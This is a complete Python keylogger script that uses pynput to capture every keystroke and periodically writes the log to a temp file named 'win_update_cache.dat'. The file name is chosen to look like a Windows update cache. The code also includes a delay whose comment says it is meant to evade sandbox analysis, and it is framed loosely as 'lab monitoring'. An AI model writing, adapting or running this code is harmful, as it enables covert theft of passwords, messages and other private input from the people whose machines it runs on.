import pynput.keyboard
import os
import tempfile
import threading
import time
import sys

class BackgroundProvider:
    def __init__(self):
        self.log_path = os.path.join(tempfile.gettempdir(), "win_update_cache.dat")
        self.buffer = []
        self.lock = threading.Lock()
        self.running = True

    def save_data(self):
        """Writes memory buffer to disk every 20 seconds."""
        while self.running:
            time.sleep(20)
            self._flush_to_disk()

    def _flush_to_disk(self):
        with self.lock:
            if self.buffer:
                try:
                    with open(self.log_path, "a") as f:
                        f.write("".join(self.buffer))
                    self.buffer = [] # Clear memory after writing
                except Exception:
                    pass

    def on_press(self, key):
        try:
            char = key.char if key.char is not None else ""
        except AttributeError:
            key_map = {
                pynput.keyboard.Key.space: " ",
                pynput.keyboard.Key.enter: "\n[ENTER]\n",
                pynput.keyboard.Key.tab: " [TAB] ",
                pynput.keyboard.Key.backspace: " [BCK] ",
                pynput.keyboard.Key.ctrl_l: " [L_CTRL] ",
                pynput.keyboard.Key.ctrl_r: " [R_CTRL] ",
                pynput.keyboard.Key.alt_l: " [L_ALT] ",
                pynput.keyboard.Key.alt_gr: " [R_ALT] ",
                pynput.keyboard.Key.shift: " [SHIFT] ",
                pynput.keyboard.Key.cmd: " [WIN] ",
                pynput.keyboard.Key.caps_lock: " [CAPS] ",
                pynput.keyboard.Key.esc: " [ESC] ",
            }
            
            char = key_map.get(key, f" [{str(key).replace('Key.', '')}] ")

        with self.lock:
            self.buffer.append(char)

    def start(self):
      
        save_thread = threading.Thread(target=self.save_data, daemon=True)
        save_thread.start()

        print(f"[*] Lab monitoring started. Data saving to: {self.log_path}")
        
        try:
            with pynput.keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            print("\n[*] Stopping... Saving final strokes.")
            self.running = False
            self._flush_to_disk()
            sys.exit(0)

if __name__ == "__main__":
    # Small delay to bypass instant sandbox analysis
    time.sleep(2)
    provider = BackgroundProvider()
    provider.start()